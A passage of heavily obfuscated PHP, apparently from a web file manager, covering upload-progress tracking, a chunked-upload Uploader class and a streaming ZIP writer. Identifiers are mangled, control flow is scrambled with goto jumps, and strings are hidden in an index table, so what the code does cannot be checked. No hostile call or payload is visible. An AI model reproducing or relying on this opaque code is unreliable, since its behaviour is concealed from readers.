$dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1477]] / $dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1476]]; } $dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1432]] = $d´¼Âˆì× * 0.3; } else { if ($dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1504]] == $A¤£Ã»Û³Ò[301]) { $d´¼Âˆì× = $dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[984]] / $dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[970]]; $dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1432]] = 0.3 + $d´¼Âˆì× * 0.4; } else { if ($dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1504]] == $A¤£Ã»Û³Ò[103]) { $DØãò¹­¯À = 0; if ($dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1478]] == $A¤£Ã»Û³Ò[103]) { $DØãò¹­¯À = $dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1477]]; } $d´¼Âˆì× = ($dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1481]] + $DØãò¹­¯À) / $dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[697]]; $dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1432]] = 0.3 + 0.4 + $d´¼Âˆì× * 0.3; } } } if ($dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1432]] > 0) { $EÇƒê¶øƒ = timeFloat() - $dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1434]] - $dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1437]]; $dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1438]] = $EÇƒê¶øƒ * (1 - $dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1432]]) / $dÎ¾ô„ïÁá[$A¤£Ã»Û³Ò[1432]]; } } public function addFile($f¿Š·Šï‘×) { goto Fæô‰æì˜§; Fæô‰æì˜§: $F»Çîä»¿× =& $_SERVER[îÖ]; $fÉÔµ‡·Í =& $this->task; $dôßÁöˆ½ª = IO::info($f¿Š·Šï‘×); goto aÂÂ—†ÅÆ¢; FÑ“×‡í×: $this->update(); goto E¶œïÙİõø; C¾ÆÚÒÖ”„: $fÉÔµ‡·Í[$F»Çîä»¿×[972]] = $F»Çîä»¿×[1493]; $fÉÔµ‡·Í[$F»Çîä»¿×[1478]] = $F»Çîä»¿×[1034]; $fÉÔµ‡·Í[$F»Çîä»¿×[697]] = $dôßÁöˆ½ª[$F»Çîä»¿×[77]]; goto F›‡ŒìÙ Ö; F›‡ŒìÙ Ö: $fÉÔµ‡·Í[$F»Çîä»¿×[970]] = 1; $AÒ‰š¸É‰ˆ = 0; $fÉÔµ‡·Í[$F»Çîä»¿×[1485]] = array($F»Çîä»¿×[1486] => $AÒ‰š¸É‰ˆ + 1, $F»Çîä»¿×[386] => $dôßÁöˆ½ª[$F»Çîä»¿×[28]], $F»Çîä»¿×[75] => $dôßÁöˆ½ª[$F»Çîä»¿×[75]], $F»Çîä»¿×[466] => $dôßÁöˆ½ª[$F»Çîä»¿×[466]] ? $dôßÁöˆ½ª[$F»Çîä»¿×[466]] : $dôßÁöˆ½ª[$F»Çîä»¿×[75]]); goto FÑ“×‡í×; aÂÂ—†ÅÆ¢: $fÉÔµ‡·Í[$F»Çîä»¿×[1474]] = $dôßÁöˆ½ª[$F»Çîä»¿×[28]]; $fÉÔµ‡·Í[$F»Çîä»¿×[1476]] = $dôßÁöˆ½ª[$F»Çîä»¿×[77]]; $fÉÔµ‡·Í[$F»Çîä»¿×[1477]] = 0; goto C¾ÆÚÒÖ”„; E¶œïÙİõø: } public function unzipAfter($C¡Şî¢£éš) { goto cˆİ–Ÿ©ĞŠ; FÖÎåò¦’±: $CÍä¿†‰„Â[$C‡Ì…§©ëñ[1474]] = $C‡Ì…§©ëñ[33]; $CÍä¿†‰„Â[$C‡Ì…§©ëñ[1481]] = 0; $CÍä¿†‰„Â[$C‡Ì…§©ëñ[697]] = $BèŒø¹¬…‰[$C‡Ì…§©ëñ[77]]; goto bç¥¢¿Ê‰Â; cˆİ–Ÿ©ĞŠ: $C‡Ì…§©ëñ =& $_SERVER[îÖ]; $CÍä¿†‰„Â =& $this->task; $CÍä¿†‰„Â[$C‡Ì…§©ëñ[1504]] = $C‡Ì…§©ëñ[103]; goto f˜µÛ˜‡¡; f˜µÛ˜‡¡: $BèŒø¹¬…‰ = IO::infoWithChildren($C¡Şî¢£éš); $e¡á²æµ‰µ = 0; $CÍä¿†‰„Â[$C‡Ì…§©ëñ[1485]] = array($C‡Ì…§©ëñ[1486] => $e¡á²æµ‰µ + 1, $C‡Ì…§©ëñ[386] => $BèŒø¹¬…‰[$C‡Ì…§©ëñ[28]], $C‡Ì…§©ëñ[75] => $BèŒø¹¬…‰[$C‡Ì…§©ëñ[75]], $C‡Ì…§©ëñ[466] => $BèŒø¹¬…‰[$C‡Ì…§©ëñ[466]] ? $BèŒø¹¬…‰[$C‡Ì…§©ëñ[466]] : $BèŒø¹¬…‰[$C‡Ì…§©ëñ[75]]); goto E¡İ‘¶ˆğË; E¡İ‘¶ˆğË: if ($BèŒø¹¬…‰[$C‡Ì…§©ëñ[29]] == $C‡Ì…§©ëñ[167]) { $CÍä¿†‰„Â[$C‡Ì…§©ëñ[970]] = 1; } else { $CÍä¿†‰„Â[$C‡Ì…§©ëñ[970]] = $BèŒø¹¬…‰[$C‡Ì…§©ëñ[80]][$C‡Ì…§©ëñ[78]]; } $CÍä¿†‰„Â[$C‡Ì…§©ëñ[972]] = $C‡Ì…§©ëñ[33]; $CÍä¿†‰„Â[$C‡Ì…§©ëñ[1478]] = 0; goto AÅëÔªîÑí; bç¥¢¿Ê‰Â: $this->update(); self::log($C‡Ì…§©ëñ[1506] . json_encode(array($CÍä¿†‰„Â, $BèŒø¹¬…‰))); goto aîæá¥ ™; AÅëÔªîÑí: $CÍä¿†‰„Â[$C‡Ì…§©ëñ[984]] = 0; $CÍä¿†‰„Â[$C‡Ì…§©ëñ[1476]] = 0; $CÍä¿†‰„Â[$C‡Ì…§©ëñ[1477]] = 0; goto FÖÎåò¦’±; aîæá¥ ™: } public function nameParse($døà§ƒ–Û) { goto AÔ¶ø‚Ü‰‹; AÖëéÁ£: $this->update(); goto BÌŸÁ¬ôæ¶; AÔ¶ø‚Ü‰‹: $A«¹£±ì± =& $_SERVER[îÖ]; $D¿¬¢ø›óò =& $this->task; if ($D¿¬¢ø›óò[$A«¹£±ì±[1504]] == $A«¹£±ì±[1034]) { $D¿¬¢ø›óò[$A«¹£±ì±[1504]] = $A«¹£±ì±[301]; $D¿¬¢ø›óò[$A«¹£±ì±[1481]] = 0; $D¿¬¢ø›óò[$A«¹£±ì±[697]] = 0; } goto f‘ÕÄ”ÀôÏ; f‘ÕÄ”ÀôÏ: $B»ö¸«õ‡ = get_path_this($døà§ƒ–Û); if (strstr($B»ö¸«õ‡, $A«¹£±ì±[91])) { $D¿¬¢ø›óò[$A«¹£±ì±[984]] += 1; $D¿¬¢ø›óò[$A«¹£±ì±[970]] += 1; } $D¿¬¢ø›óò[$A«¹£±ì±[1474]] = $døà§ƒ–Û; goto AÖëéÁ£; BÌŸÁ¬ôæ¶: } } goto e…¹Í¡†Á; e‘óƒ¹†öÄ: if (class_exists($_SERVER[îÖ][1960])) { class Services_JSON_Error extends PEAR_Error { function __construct($c†‘Š¬âôÙ = "\165\x6e\x6b\156\x6f\167\x6e\x20\x65\x72\162\x6f\x72", $Bà‘¬—Ü = null, $D³î…ª§Ö˜ = null, $Dİ¯Ÿ´‚ªĞ = null, $BéğªÁ¾ªÚ = null) { parent::PEAR_Error($c†‘Š¬âôÙ, $Bà‘¬—Ü, $D³î…ª§Ö˜, $Dİ¯Ÿ´‚ªĞ, $BéğªÁ¾ªÚ); } } } else { class Services_JSON_Error { function __construct($FĞ²‹Ø›ƒ† = "\165\x6e\153\156\157\167\x6e\x20\145\162\x72\157\162", $dáÂÉœÄ = null, $c´Ğ×®áã = null, $f˜ÊğÖ½äĞ = null, $E»¿Ï¸—é„ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto B÷Úƒˆ¯Íñ; B÷Úƒˆ¯Íñ: $D·©áğÃ‰² =& $_SERVER[îÖ]; global $in; $this->in =& $in; goto dó¦°òĞàÁ; dó¦°òĞàÁ: if (!empty($_FILES)) { $b­„²ÓĞŞİ = $_FILES[$D·©áğÃ‰²[167]]; $this->uploadFile = $b­„²ÓĞŞİ[$D·©áğÃ‰²[1961]]; if (!$this->uploadFile && $b­„²ÓĞŞİ[$D·©áğÃ‰²[1213]] > 0) { show_json($this->errorInfo($b­„²ÓĞŞİ[$D·©áğÃ‰²[1213]]), !1); } } else { if (isset($in[$D·©áğÃ‰²[386]])) { $this->uploadFile = isset($in[$D·©áğÃ‰²[1962]]) ? $D·©áğÃ‰²[1963] : $D·©áğÃ‰²[1808]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto Aƒ½³¹òğ; Aƒ½³¹òğ: $this->checkSize(); $this->tempPathInit(); goto Ağ˜Ü›ˆ„; Ağ˜Ü›ˆ„: } public function upload() { goto fƒ¹£Ú”¡È; F©Ÿóõİã: CacheLock::lock($this->tempFile, 20); $DÖÎ»ÊĞåÜ = $this->statusGet(); $this->initFileTemp(); goto F©Ë¹„Ìîë; dŞÃÅ²‹ƒ: if ($f‡õèîé‹ > 1 && $Dí„¶‹ó·œ <= 0) { show_json($c¿Õù–­å¨[1968], !1); } if ($Dí„¶‹ó·œ > $aâá©áÒ©§) { $f‡õèîé‹ = 1; } if ($f‡õèîé‹ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto F©Ÿóõİã; BÁ òÓÒğ: CacheLock::unlock($this->tempFile); return $this->tempFile; goto e¸««¬å×·; F©Ë¹„Ìîë: $b¤ËÖ¢â® = $this->moveUploadedFile($Aƒˆ¸Á·£); if ($aâá©áÒ©§ > 0 && filesize($b¤ËÖ¢â®) == 0) { $this->showJson($c¿Õù–­å¨[1969], !1); } if (!$b¤ËÖ¢â®) { $this->showJson(LNG($c¿Õù–­å¨[1970]), !1); } goto FŠ•Ñ§ˆ†ƒ; C³ôÁ¹ªŒÑ: $Aƒˆ¸Á·£ = $this->tempFile . $c¿Õù–­å¨[1966] . $bÎñŠ©½Ç; $aâá©áÒ©§ = isset($this->in[$c¿Õù–­å¨[520]]) ? intval($this->in[$c¿Õù–­å¨[520]]) : 0; $Dí„¶‹ó·œ = isset($this->in[$c¿Õù–­å¨[1967]]) ? intval($this->in[$c¿Õù–­å¨[1967]]) : 0; goto dŞÃÅ²‹ƒ; f¢³¸¥ÊŒ: ignore_timeout(); if (!$this->checkChunkHash($DÖÎ»ÊĞåÜ)) { $this->showJson($c¿Õù–­å¨[1978], !1); } $this->statusSet(!1); goto BÁ òÓÒğ; aà‘îê¬Šƒ: $DÖÎ»ÊĞåÜ[$c¿Õù–­å¨[1974]][$c¿Õù–­å¨[1975] . $bÎñŠ©½Ç] = array($c¿Õù–­å¨[1976] => $DÆ˜ÉöÜƒ, $c¿Õù–­å¨[1030] => $bÎñŠ©½Ç, $c¿Õù–­å¨[77] => $aâá©áÒ©§, $c¿Õù–­å¨[164] => $B‰™Ûõ™ğ·); $this->statusSet($DÖÎ»ÊĞåÜ); if (count($DÖÎ»ÊĞåÜ[$c¿Õù–­å¨[1974]]) != $DÖÎ»ÊĞåÜ[$c¿Õù–­å¨[1973]]) { $this->showJson($c¿Õù–­å¨[1977] . $bÎñŠ©½Ç, !0); } goto f¢³¸¥ÊŒ; e§‡ÄëŠîù: @unlink($b¤ËÖ¢â®); if (!$e«Ïã÷º¿) { $this->showJson($c¿Õù–­å¨[1972] . $bÎñŠ©½Ç, !1); } $DÖÎ»ÊĞåÜ[$c¿Õù–­å¨[1973]] = $f‡õèîé‹; goto aà‘îê¬Šƒ; FŠ•Ñ§ˆ†ƒ: $DÆ˜ÉöÜƒ = $bÎñŠ©½Ç * $Dí„¶‹ó·œ; $f„¥µå†ì® = @fopen($this->tempFile, $c¿Õù–­å¨[1971]); fseek($f„¥µå†ì®, $DÆ˜ÉöÜƒ); goto F±ß•º­À; F±ß•º­À: $e«Ïã÷º¿ = $this->writeTo($b¤ËÖ¢â®, $f„¥µå†ì®, $this->tempFile); $B‰™Ûõ™ğ· = IO::hashSimple($b¤ËÖ¢â®); $aâá©áÒ©§ = IO::size($b¤ËÖ¢â®); goto e§‡ÄëŠîù; fƒ¹£Ú”¡È: $c¿Õù–­å¨ =& $_SERVER[îÖ]; $bÎñŠ©½Ç = isset($this->in[$c¿Õù–­å¨[1964]]) ? intval($this->in[$c¿Õù–­å¨[1964]]) : 0; $f‡õèîé‹ = isset($this->in[$c¿Õù–­å¨[1965]]) ? intval($this->in[$c¿Õù–­å¨[1965]]) : 1; goto C³ôÁ¹ªŒÑ; e¸««¬å×·: } private function checkSize() { $E±Àî”Ì™ =& $_SERVER[îÖ]; if (phpBuild64() || $this->in[$E±Àî”Ì™[77]] < PHP_INT_MAX) { return; } show_json(LNG($E±Àî”Ì™[1979]), !1); } private function showJson($EËÆ§¾ÛÏÉ, $b´¼µºÚ‰Ê) { CacheLock::unlock($this->tempFile); if (!$b´¼µºÚ‰Ê) { return show_json($EËÆ§¾ÛÏÉ, $b´¼µºÚ‰Ê); } show_json($EËÆ§¾ÛÏÉ, $b´¼µºÚ‰Ê); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto a³¸ÖÓòô; AøŞèÒ²Î: $this->tempFile = $b­Õî¿³£À . $aï×Íğ¸ [1982] . md5($aÉ²ãÄ‡Š’ . $this->in[$aï×Íğ¸ [1526]]); goto C»ĞñßÃĞï; a³¸ÖÓòô: $aï×Íğ¸  =& $_SERVER[îÖ]; $b­Õî¿³£À = TEMP_FILES; @mk_dir($b­Õî¿³£À); goto D·‘¬¾µÑß; D·‘¬¾µÑß: touch($b­Õî¿³£À . $aï×Íğ¸ [1980]); $aÉ²ãÄ‡Š’ = isset($this->in[$aï×Íğ¸ [1981]]) ? $this->in[$aï×Íğ¸ [1981]] : !1; if (strlen($aÉ²ãÄ‡Š’) < 30) { $aÉ²ãÄ‡Š’ = md5(USER_ID . $this->in[$aï×Íğ¸ [75]] . $this->fileName . $this->in[$aï×Íğ¸ [77]]); } goto AøŞèÒ²Î; C»ĞñßÃĞï: } private function moveUploadedFile($B–¦ĞÙÖà) { $aó‘¾ÎÈÏé =& $_SERVER[îÖ]; $e¡š´‡Ğİ² = $this->uploadFile; if ($e¡š´‡Ğİ² == $aó‘¾ÎÈÏé[1983]) { @file_put_contents($B–¦ĞÙÖà, base64_decode($_REQUEST[$aó‘¾ÎÈÏé[1984]])); } else { if ($e¡š´‡Ğİ² == $aó‘¾ÎÈÏé[1808]) { $c¢¥’³ñÕ = @fopen($B–¦ĞÙÖà, $aó‘¾ÎÈÏé[1516]); $this->writeTo($e¡š´‡Ğİ², $c¢¥’³ñÕ, $B–¦ĞÙÖà); } else { if (!move_uploaded_file($e¡š´‡Ğİ², $B–¦ĞÙÖà)) { return !1; } } } return $B–¦ĞÙÖà; } private function writeTo($D×ÒôääÙ, $DÉÆÜ™½, $BµÄïæÊ‘) { goto AêÕÌ–Î¨ƒ; Döàç¢¦©Ñ: $CÎÖ¦Ã£¤ = @fopen($D×ÒôääÙ, $cŠœ–‘ä©[1515]); if (!$CÎÖ¦Ã£¤ || !$DÉÆÜ™½ || !$dËÓÖ° ‡–) { CacheLock::unlock($f¨™­•Ó·); return !1; } while (!feof($CÎÖ¦Ã£¤)) { fwrite($DÉÆÜ™½, fread($CÎÖ¦Ã£¤, 1024 * 200)); } goto FàÎôºà¾; fèÍ¤‰¸åÛ: return !0; goto eŠÕ±ÖğÊ; AêÕÌ–Î¨ƒ: $cŠœ–‘ä© =& $_SERVER[îÖ]; $f¨™­•Ó· = $cŠœ–‘ä©[1985] . $BµÄïæÊ‘; $dËÓÖ° ‡– = CacheLock::lock($f¨™­•Ó·, 1); goto Döàç¢¦©Ñ; FàÎôºà¾: fclose($CÎÖ¦Ã£¤); fclose($DÉÆÜ™½); CacheLock::unlock($f¨™­•Ó·); goto fèÍ¤‰¸åÛ; eŠÕ±ÖğÊ: } private function statusGet() { goto A‘ÚóŠ‚—; a„†Ìò”©: $B¢°å”ò¥Ó = !1; if (file_exists($bÇ£æîä‰Û)) { $B¢°å”ò¥Ó = @file_get_contents($bÇ£æîä‰Û); } if ($B¢°å”ò¥Ó) { $this->statusData = json_decode($B¢°å”ò¥Ó, !0); } goto eñ’ãĞ°æà; A‘ÚóŠ‚—: $cŞò™†§Ç =& $_SERVER[îÖ]; if (is_array($this->statusData)) { return $this->statusData; } $bÇ£æîä‰Û = $this->tempFile . $cŞò™†§Ç[1986]; goto a„†Ìò”©; eñ’ãĞ°æà: if (!$this->statusData) { $fŠ©“ÇÅÀ” = array($cŞò™†§Ç[28] => $this->fileName, $cŞò™†§Ç[1973] => 0, $cŞò™†§Ç[1974] => array()); $this->statusSet($fŠ©“ÇÅÀ”); } return $this->statusData; goto Eìº©¢¨—®; Eìº©¢¨—®: } public function statusSet($A–ÕÅºÇé‹) { $a“’™ŠÜ¨ = $this->tempFile . $_SERVER[îÖ][1986]; if (!$A–ÕÅºÇé‹) { if (file_exists($a“’™ŠÜ¨)) { @unlink($a“’™ŠÜ¨); } return !0; } $this->statusData = $A–ÕÅºÇé‹; return file_put_contents($a“’™ŠÜ¨, json_encode($A–ÕÅºÇé‹)); } private function initFileTemp() { $bõ¨×§ä =& $_SERVER[îÖ]; if (file_exists($this->tempFile)) { return; } $eÉ£‡Ò¿àã = fopen($this->tempFile, $bõ¨×§ä[1987]); fseek($eÉ£‡Ò¿àã, $this->in[$bõ¨×§ä[77]] - 1, SEEK_SET); fwrite($eÉ£‡Ò¿àã, $bõ¨×§ä[468]); fclose($eÉ£‡Ò¿àã); } public function checkChunk() { goto C”Š”“Ú; FÈ“Œà²: return $eÊ±èÏ•»Ü; goto dï‡¼øˆ›ç; C“İ†ó…ë¨: $Bœâ™ÔöÛ§ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($Bœâ™ÔöÛ§[$Eëïß„¦èã[1974]] as $BŞ‚±İŠ´) { $bÆ¸ øøõ¦ = $BŞ‚±İŠ´[$Eëïß„¦èã[164]]; if ($bÆ¸ øøõ¦) { $eÊ±èÏ•»Ü[$Eëïß„¦èã[1988] . $BŞ‚±İŠ´[$Eëïß„¦èã[1030]]] = $bÆ¸ øøõ¦; } } goto FÈ“Œà²; C”Š”“Ú: $Eëïß„¦èã =& $_SERVER[îÖ]; $eÊ±èÏ•»Ü = array(); CacheLock::lock($this->tempFile); goto C“İ†ó…ë¨; dï‡¼øˆ›ç: } private function checkChunkHash($Fİî¼ÙÇ´) { goto BÍ”Íàá£ö; C‘ÆğÙ‡¹ï: $cÏÔœÏÙ²˜ = _get($this->in, $CÎ¦­¥Êï‘[1989]); if (strlen($cÏÔœÏÙ²˜) == 32 && IO::hashSimple($this->tempFile) == $dÏ‰µ‰Ñ¨— && IO::hashMd5($this->tempFile) == $cÏÔœÏÙ²˜) { return !0; } $C”å†éÇ = fopen($this->tempFile, $CÎ¦­¥Êï‘[1164]); goto aµ‘•»ßë¡; aµ‘•»ßë¡: $Dò†›—½Ò‰ = !0; foreach ($Fİî¼ÙÇ´[$CÎ¦­¥Êï‘[1974]] as $Aø´Ç‘¯ÛÎ) { fseek($C”å†éÇ, $Aø´Ç‘¯ÛÎ[$CÎ¦­¥Êï‘[1976]]); $d‹ĞãÈ¿™Ç = PathDriverStream::hash($C”å†éÇ, $Aø´Ç‘¯ÛÎ[$CÎ¦­¥Êï‘[77]]); if ($Aø´Ç‘¯ÛÎ[$CÎ¦­¥Êï‘[164]] != $d‹ĞãÈ¿™Ç) { $Dò†›—½Ò‰ = !1; break; } } fclose($C”å†éÇ); goto eãùƒ§Äà; BÍ”Íàá£ö: $CÎ¦­¥Êï‘ =& $_SERVER[îÖ]; if (count($Fİî¼ÙÇ´[$CÎ¦­¥Êï‘[1974]]) != $Fİî¼ÙÇ´[$CÎ¦­¥Êï‘[1973]]) { return !1; } $dÏ‰µ‰Ñ¨— = _get($this->in, $CÎ¦­¥Êï‘[1981]); goto C‘ÆğÙ‡¹ï; eãùƒ§Äà: return $Dò†›—½Ò‰; goto fÀÅÙæ¶ß½; fÀÅÙæ¶ß½: } public static function fileName() { goto E×”‚ñƒñ; E×”‚ñƒñ: $EË’ôİÈàã =& $_SERVER[îÖ]; global $in; $DƒåË˜‰¯ = isset($in[$EË’ôİÈàã[28]]) ? $in[$EË’ôİÈàã[28]] : $EË’ôİÈàã[33]; goto eøëã¸õİ; a¯—î¦‹Ÿ’: $F£Ûœ¹•˜ = $F£Ûœ¹•˜ ? $F£Ûœ¹•˜ : time(); $F¡œÜåŒìí = strtolower($DƒåË˜‰¯); if ($F¡œÜåŒìí == $EË’ôİÈàã[1991] || $F¡œÜåŒìí == $EË’ôİÈàã[1992]) { $DƒåË˜‰¯ = date($EË’ôİÈàã[689], $F£Ûœ¹•˜) . $EË’ôİÈàã[70] . $in[$EË’ôİÈàã[77]] . $EË’ôİÈàã[1623]; } else { if ($F¡œÜåŒìí == $EË’ôİÈàã[1993]) { $DƒåË˜‰¯ = date($EË’ôİÈàã[689], $F£Ûœ¹•˜) . $EË’ôİÈàã[70] . $in[$EË’ôİÈàã[77]] . $EË’ôİÈàã[1994]; } } goto a”²·¦Œê; eøëã¸õİ: if (!empty($_FILES)) { $DƒåË˜‰¯ = $DƒåË˜‰¯ ? $DƒåË˜‰¯ : $_FILES[$EË’ôİÈàã[167]][$EË’ôİÈàã[386]]; } if (!is_wap()) { return KodIO::clear($DƒåË˜‰¯); } $F£Ûœ¹•˜ = strtotime($in[$EË’ôİÈàã[1990]]); goto a¯—î¦‹Ÿ’; a”²·¦Œê: return KodIO::clear($DƒåË˜‰¯); goto bË·È‰š˜; bË·È‰š˜: } private function errorInfo($F×„ÑŠé§…) { $aÛ±œèÉè =& $_SERVER[îÖ]; $cô¬Şšì›ù = array($aÛ±œèÉè[1995], $aÛ±œèÉè[1996], $aÛ±œèÉè[1997], $aÛ±œèÉè[1998], $aÛ±œèÉè[1999], $aÛ±œèÉè[2000], $aÛ±œèÉè[2001], $aÛ±œèÉè[2002]); return $F×„ÑŠé§… . $aÛ±œèÉè[4] . $cô¬Şšì›ù[$F×„ÑŠé§…]; } } class ZipMake { const VERSION = "\60\x2e\x32\x2e\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($A¬ëÔå®Ñ = null) { $CØáºŸàºÊ =& $_SERVER[îÖ]; $this->outputStream = fopen($CØáºŸàºÊ[2003], $CØáºŸàºÊ[1220]); $this->outputName = $A¬ëÔå®Ñ; $this->needHeaders = !0; } public function addFile($dÎÅ¤æ¸, $D¦éï’µò¨) { goto a— ÖÒÇ”; e„ê¼—âÒ: $this->addFileFooter($dÎÅ¤æ¸, $Bù×ÉÕ»ËÌ, $F•ãÚºê±¾, $c«‡ëÏš›, $AÚ¯£ËÛ, $aÖ¿„Á½‰—); goto EÓŞä£³ÔÚ; f÷ÈÚËãíÜ: while (!feof($fˆ¾ˆ½î²)) { $Aó™Õ—µ‰ğ = fread($fˆ¾ˆ½î², 1048576); $this->send($Aó™Õ—µ‰ğ); } fclose($fˆ¾ˆ½î²); $F•ãÚºê±¾ = hexdec(hash_file($F†Ò¿Å³å[2005], $D¦éï’µò¨)); goto e„ê¼—âÒ; a— ÖÒÇ”: $F†Ò¿Å³å =& $_SERVER[îÖ]; $dÎÅ¤æ¸ = $this->filterFilename($dÎÅ¤æ¸); $Bù×ÉÕ»ËÌ = static::METHOD_STORE; goto fÃ–çŠ’‚Š; fÃ–çŠ’‚Š: $aÖ¿„Á½‰— = $this->addFileHeader($dÎÅ¤æ¸, $Bù×ÉÕ»ËÌ); $c«‡ëÏš› = $AÚ¯£ËÛ = filesize($D¦éï’µò¨); $fˆ¾ˆ½î² = fopen($D¦éï’µò¨, $F†Ò¿Å³å[2004]); goto f÷ÈÚËãíÜ; EÓŞä£³ÔÚ: } public function addFileFromStream($bÛ§¯ƒŞ‰é, $dãÒî÷Ñ®ò) { goto fàÂàÅ…æ; e¢ƒÜà„˜ß: $this->addFileFooter($bÛ§¯ƒŞ‰é, $F»Ç»ªÚ®, $e†öƒ‡¢­Ê, $b¥¯áìšÅ, $AÄ·‹¡¸õ‡, $CªŞğ‹†¢Ó); goto B¹³¯¬Œæˆ; fàÂàÅ…æ: $bÛ§¯ƒŞ‰é = $this->filterFilename($bÛ§¯ƒŞ‰é); $F»Ç»ªÚ® = static::METHOD_STORE; $CªŞğ‹†¢Ó = $this->addFileHeader($bÛ§¯ƒŞ‰é, $F»Ç»ªÚ®); goto FÅ¥‡±À¶¢; DÏ†‰†¹“: $Fö‰«¿´…² = hash_init($_SERVER[îÖ][2005]); while (!feof($dãÒî÷Ñ®ò)) { $aÏ´Ú›¯‚» = fread($dãÒî÷Ñ®ò, 1048576); hash_update($Fö‰«¿´…², $aÏ´Ú›¯‚»); $this->send($aÏ´Ú›¯‚»); } $e†öƒ‡¢­Ê = hexdec(hash_final($Fö‰«¿´…²)); goto e¢ƒÜà„˜ß; FÅ¥‡±À¶¢: fseek($dãÒî÷Ñ®ò, 0, SEEK_END); $b¥¯áìšÅ = $AÄ·‹¡¸õ‡ = ftell($dãÒî÷Ñ®ò); rewind($dãÒî÷Ñ®ò); goto DÏ†‰†¹“; B¹³¯¬Œæˆ: } public function finish() { foreach ($this->files as $AÂÔÉ‚ÄÖÇ) { $this->addCdrFile($AÂÔÉ‚ÄÖÇ); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($AèÂ¡Ü°ÄÉ, $C“ö÷…˜²ò) { goto FîÉÂĞ¥•¿; D¹Ü’“¬‰: $BÕáë²¡¤ˆ = $this->packFields($B‡ù›Â™›‚); $eÊÜŞˆšÖ– = $this->packFields($B¶ğÀœâø); $this->send($BÕáë²¡¤ˆ . $AèÂ¡Ü°ÄÉ . $eÊÜŞˆšÖ–); goto aÏ¡ˆ·îÅœ; d¥î„ğÏß¶: $f—³¶¦Ñ°¯ = $this->dosTime(time()); $B‡ù›Â™›‚ = array(array($D¾Õš—¥î[2007], static::FILE_HEADER_SIGNATURE), array($D¾Õš—¥î[2008], static::ZIP_VERSION_64), array($D¾Õš—¥î[2008], 8), array($D¾Õš—¥î[2008], $C“ö÷…˜²ò), array($D¾Õš—¥î[2007], $f—³¶¦Ñ°¯), array($D¾Õš—¥î[2007], 0), array($D¾Õš—¥î[2007], 4294967295), array($D¾Õš—¥î[2007], 4294967295), array($D¾Õš—¥î[2008], $B½«Ù¨ãŠİ), array($D¾Õš—¥î[2008], 32)); $B¶ğÀœâø = array(array($D¾Õš—¥î[2008], 1), array($D¾Õš—¥î[2008], 28), array($D¾Õš—¥î[2009], 0), array($D¾Õš—¥î[2009], 0), array($D¾Õš—¥î[2009], 0), array($D¾Õš—¥î[2007], 0)); goto D¹Ü’“¬‰; aÏ¡ˆ·îÅœ: return strlen($BÕáë²¡¤ˆ) + $B½«Ù¨ãŠİ + strlen($eÊÜŞˆšÖ–); goto EäëÜõ•Õê; FîÉÂĞ¥•¿: $D¾Õš—¥î =& $_SERVER[îÖ]; $AèÂ¡Ü°ÄÉ = preg_replace($D¾Õš—¥î[2006], $D¾Õš—¥î[33], $AèÂ¡Ü°ÄÉ); $B½«Ù¨ãŠİ = strlen($AèÂ¡Ü°ÄÉ); goto d¥î„ğÏß¶; EäëÜõ•Õê: } protected function addFileFooter($AôĞÕ‚Ò¶’, $DËƒí¡Œ«, $E—·†â¢•á, $c“êİ‰ƒÃ‘, $f‡µš¸ŸÆĞ, $aĞ¹—Öï) { $eÔÇ½íç‡µ =& $_SERVER[îÖ]; $dİš”Ø¶Š = array(array($eÔÇ½íç‡µ[2007], static::DATA_DESCRIPTOR_SIGNATURE), array($eÔÇ½íç‡µ[2007], $E—·†â¢•á), array($eÔÇ½íç‡µ[2009], $c“êİ‰ƒÃ‘), array($eÔÇ½íç‡µ[2009], $f‡µš¸ŸÆĞ)); $Bßš…Äèãİ = $this->packFields($dİš”Ø¶Š); $this->send($Bßš…Äèãİ); $eÙöæÜ÷êÃ = $aĞ¹—Öï + $c“êİ‰ƒÃ‘ + $aÀÄ”Íñ¦ó; $this->addToCdr($AôĞÕ‚Ò¶’, $DËƒí¡Œ«, $E—·†â¢•á, $c“êİ‰ƒÃ‘, $f‡µš¸ŸÆĞ, $eÙöæÜ÷êÃ); } private function addToCdr($DÓ‘×¿Û» , $A™İã©­øí, $aîÜõŞ”±, $cÛ‹Á§„Ô’, $dÖï‚•Çê, $BšØ±Ïå ) { $this->files[] = array($DÓ‘×¿Û» , $A™İã©­øí, $aîÜõŞ”±, $cÛ‹Á§„Ô’, $dÖï‚•Çê, $this->ofs); $this->ofs += $BšØ±Ïå ; } protected function addCdrFile($FÜçà Œ¹Å) { goto d¹µÊ‚Ë™ö; CĞÙóß‚¤Ÿ: 